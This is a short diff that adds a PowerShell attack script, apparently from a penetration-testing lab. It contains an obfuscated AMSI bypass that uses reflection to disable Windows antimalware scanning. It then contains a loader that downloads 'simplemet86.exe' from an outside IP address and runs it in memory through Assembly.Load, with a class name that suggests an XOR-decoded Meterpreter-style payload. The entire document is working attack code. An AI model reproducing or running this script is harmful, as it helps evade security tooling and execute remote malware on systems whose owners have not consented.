@@ -1,0 +1,5 @@
+# AMSI Bypass
+$a = 'si'; $b = 'Am'; $Ref = [Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils' -f $b, $a)); $z = $Ref.GetField(('am{0}InitFailed' -f $a),'NonPublic,Static'); $z.SetValue($null,$true)
+# Reflection execution of the simplemet86.exe
+$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.191/simplemet86.exe'); $assem =
+[System.Reflection.Assembly]::Load($data);[PayloadFInalAfterXOR.Program]::Main("".Split())
